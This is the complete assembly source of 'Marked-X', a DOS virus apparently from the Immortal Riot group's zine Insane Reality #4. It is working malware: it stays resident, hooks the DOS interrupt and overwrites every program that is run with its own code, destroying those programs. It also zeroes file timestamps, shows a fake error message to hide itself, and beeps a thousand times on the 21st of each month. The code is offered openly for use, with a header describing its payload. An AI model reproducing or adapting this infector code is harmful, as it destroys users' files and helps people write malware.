; Virusname  : Marked-X
; Virusauthor: Metal Militia
; Virusgroup : Immortal Riot
; Origin     : Sweden
;
; It's a TSR, overwriting infector on files executed. If it's the
; twenty-first of any month it'll print a note and beep one thousand
; times. It also sets time/date to 00-00-00 so nothing will be shown
; in the fields when you take a "dir". It'll print a faked note when
; it goes into memory aswell saying they executed the file's not there.
; Urmm!.. Anyhow, enjoy Insane Reality #4!
;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;			     MARKED-X
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

virus    segment ; segment's and shit
         assume cs:virus,ds:virus
         org    100h
start:   mov    ah,2ah
         int    21h
         cmp    dl,21
         je     happy_happy_joy_joy

         mov    ah,9h    ; Print the faked
         mov    dx,offset note ; note.. (bad commie or filename)
         int    21h
         jmp    makemegotsr

happy_happy_joy_joy:
         mov    ah,9h             ; Print the virus note
         mov    dx,offset society ; to show that we're here
         int    21h

         mov    cx,1000           ; Print 1000
         mov    ax,0e07h          ; "beep-letters"
beeper:
         int    10h               ; to screen
         loop   beeper            ; (results in [ofcause] 1000 beepies)

makemegotsr:
         jmp    tsrdata ; Celebrate! now put us as a TSR in memory
new21:   pushf          ; Pushfar
         cmp    ah,4bh ; Is a file being run?
         jz     infect ; If so, infect it
         jmp    short end21 ; If not, back to old int21 vector

infect:  mov    ax,4301h ; Set attrib's to zero, keines, finito
         and    cl,0feh
         int    21h

         mov    ax,3d02h ; Open file
         int    21h
         mov    bx,ax ; or.. xchg ax,bx.. but that doesn't work here
         push   ax    ; Push all
         push   bx
         push   cx
         push   dx
         push   ds

         push   cs
         pop    ds
         mov    ax,4200h ; Move to beginning (?)
         xor    cx,cx
         cwd
         int    21h
         mov    cx,offset endvir-100h ; What to write
         mov    ah,40h ; Write it
         mov    dx,100h ; Offset start
         int    21h
         cwd          ; set date/time
         xor    cx,cx ; to zero (00-00-00)

         mov    ax,5701h ; do that
         int    21h

         mov    ah,3eh ; close file
         int    21h
x21:     pop    ds ; pop all
         pop    dx
         pop    cx
         pop    bx
         pop    ax
end21:   popf      ; pop far
         db     0eah ; Jmp far (?)
old21    dw     0,0 ; Where to store the old INT21
data     db     'Marked-X' ; Virus name
         db     'Will we ever learn to talk with eachother?' ; Virus poem
         db     '(c) Metal Militia/Immortal Riot' ; Virus author
society  db     'In any country, prison is where society sends it''s',0dh,0ah
         db     'failures, but in this country society itself is faily',0dh,0ah
         db     '$' ; Information note
note     db     'Bad command or filename',0dh,0ah
         db     '$' ; Fake note
tsrdata:
         mov    ax,3521h ; Hook int21
         int    21h
         mov    word ptr cs:old21,bx ; Where to but it
         mov    word ptr cs:old21+2,es
         mov    dx,offset new21 ; Where's our to be called
         mov    ax,2521h ; Fix it
         int    21h
         push   cs ; push it
         pop    ds ; pop it
         mov    dx,offset endvir ; Put all of us in memory
         int    27h ; Do it, TSR (terminate & stay resident)
endvir   label  byte ; End of file
virus    ends
         end    start
